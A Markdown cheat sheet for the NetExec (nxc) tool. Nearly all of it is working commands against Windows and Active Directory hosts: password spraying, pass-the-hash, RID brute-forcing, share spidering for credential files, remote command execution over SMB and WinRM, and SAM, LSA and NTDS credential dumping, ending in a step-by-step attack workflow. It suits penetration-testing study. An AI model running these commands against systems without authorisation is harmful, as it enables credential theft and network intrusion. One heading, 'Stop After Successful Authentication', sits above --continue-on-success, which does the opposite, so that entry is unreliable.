NetExec (`nxc`) is a network service enumeration and post-exploitation tool commonly used to interact with Windows/Active Directory environments.

## Basic Syntax
```bash
nxc <protocol> <target> [options]
```

Common protocols:
```text
smb
winrm
ldap
mssql
ssh
ftp
rdp
wmi
```

---

## SMB

### Basic SMB Enumeration

**Syntax:**
```bash
nxc smb <target>
```

**Example:**
```bash
nxc smb 192.168.1.10
```

Shows basic information such as:
- Hostname
- Domain/workgroup
- SMB signing
- SMB version
- OS information

---

### Scan Multiple Hosts

**Syntax:**
```bash
nxc smb <IP/range>
```

**Example:**
```bash
nxc smb 192.168.1.0/24
```

---

### Generate Hosts File

Generates a hosts file containing the discovered hostname/IP mappings.

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --generate-hosts-file <filename>
```

**Example:**
```bash
nxc smb 10.112.190.54 -u j.smith -p 'JSmith@IT2024' --generate-hosts-file host
```

This can be useful when working with an AD environment where tools require hostname resolution.

---

## SMB Authentication

### Authenticate with Username and Password

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!'
```

---

### Authenticate with NTLM Hash

**Syntax:**
```bash
nxc smb <target> -u <username> -H <NTLM_hash>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
```

Useful for **Pass-the-Hash**.

---

### Authenticate Using a Password List

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password_file>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p passwords.txt
```

---

### Test Multiple Users and Passwords

**Syntax:**
```bash
nxc smb <target> -u <users> -p <passwords>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

---

## SMB Enumeration

### Enumerate Shares

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --shares
```

**Example:**
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --shares
```

---

### Enumerate Logged-on Users

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --loggedon-users
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --loggedon-users
```

---

### Enumerate Local Users

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --users
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --users
```

---

# Enumerate Users by Bruteforcing RID

Enumerate users by bruteforcing the RID on the remote target

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

---

### Enumerate Groups

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --groups
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --groups
```

---

### Enumerate Password Policy

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --pass-pol
```

**Example:**
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --pass-pol
```

---

## SMB Share Access

### List Files in a Share

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --spider <share>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --spider Users
```

---

### Search Share Files

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --spider <share> --pattern <pattern>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --spider Users --pattern password
```

Useful for finding files containing keywords such as:
```text
password
pass
secret
credential
config
```

---

## Command Execution

### Execute a Command

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> -x "<command>"
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' -x "whoami"
```

---

### Execute PowerShell Command

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> -X "<command>"
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' -X "Get-Process"
```

---

## Credential Dumping

### Dump SAM

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --sam
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --sam
```

---

### Dump LSA Secrets

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --lsa
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --lsa
```

---

### Dump NTDS

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> --ntds
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' --ntds
```

Useful when you have sufficient privileges on a Domain Controller.

---

## WinRM

### Check WinRM Access

**Syntax:**
```bash
nxc winrm <target> -u <username> -p <password>
```

**Example:**
```bash
nxc winrm 192.168.1.10 -u administrator -p 'Password123!'
```

---

### Execute Command Through WinRM

**Syntax:**
```bash
nxc winrm <target> -u <username> -p <password> -x "<command>"
```

**Example:**
```bash
nxc winrm 192.168.1.10 -u administrator -p 'Password123!' -x "whoami"
```

---

### Pass-the-Hash Through WinRM

**Syntax:**
```bash
nxc winrm <target> -u <username> -H <NTLM_hash>
```

**Example:**
```bash
nxc winrm 192.168.1.10 -u administrator -H '<NTLM_hash>'
```

---

## LDAP

### Basic LDAP Enumeration

**Syntax:**
```bash
nxc ldap <target>
```

**Example:**
```bash
nxc ldap 192.168.1.10
```

---

### Authenticate to LDAP

**Syntax:**
```bash
nxc ldap <target> -u <username> -p <password>
```

**Example:**
```bash
nxc ldap 192.168.1.10 -u user -p 'Password123!'
```

---

### Enumerate Domain Users

**Syntax:**
```bash
nxc ldap <target> -u <username> -p <password> --users
```

**Example:**
```bash
nxc ldap 192.168.1.10 -u user -p 'Password123!' --users
```

---

### Enumerate Domain Groups

**Syntax:**
```bash
nxc ldap <target> -u <username> -p <password> --groups
```

**Example:**
```bash
nxc ldap 192.168.1.10 -u user -p 'Password123!' --groups
```

---

### Enumerate Computers

**Syntax:**
```bash
nxc ldap <target> -u <username> -p <password> --computers
```

**Example:**
```bash
nxc ldap 192.168.1.10 -u user -p 'Password123!' --computers
```

---

## Useful Options

### Specify Domain

**Syntax:**
```bash
nxc smb <target> -u <username> -p <password> -d <domain>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' -d spookysec.local
```

---

### Use a List of Targets

**Syntax:**
```bash
nxc smb <targets_file>
```

**Example:**
```bash
nxc smb targets.txt
```

---

### Stop After Successful Authentication

**Syntax:**
```bash
nxc smb <target> -u <users> -p <passwords> --continue-on-success
```

---

## Common Workflow

### 1. Discover SMB Hosts
```bash
nxc smb 192.168.1.0/24
```

### 2. Test Credentials
```bash
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

### 3. Enumerate Shares
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --shares
```

### 4. Enumerate Users
```bash
nxc smb 192.168.1.10 -u user -p 'Password123!' --users
```

### 5. Check WinRM
```bash
nxc winrm 192.168.1.10 -u user -p 'Password123!'
```

### 6. Execute Commands
```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123!' -x "whoami"
```

---

## Quick Reference

|Task|Command|
|---|---|
|SMB scan|`nxc smb <target>`|
|SMB auth|`nxc smb <target> -u <user> -p <pass>`|
|Pass-the-Hash|`nxc smb <target> -u <user> -H <hash>`|
|List shares|`--shares`|
|List users|`--users`|
|List groups|`--groups`|
|Logged-on users|`--loggedon-users`|
|Password policy|`--pass-pol`|
|Search shares|`--spider <share>`|
|Execute CMD|`-x "<command>"`|
|Execute PowerShell|`-X "<command>"`|
|Dump SAM|`--sam`|
|Dump LSA|`--lsa`|
|Dump NTDS|`--ntds`|
|Check WinRM|`nxc winrm <target>`|
|LDAP enumeration|`nxc ldap <target>`|
|Specify domain|`-d <domain>`|
|Target file|`nxc smb <targets_file>`|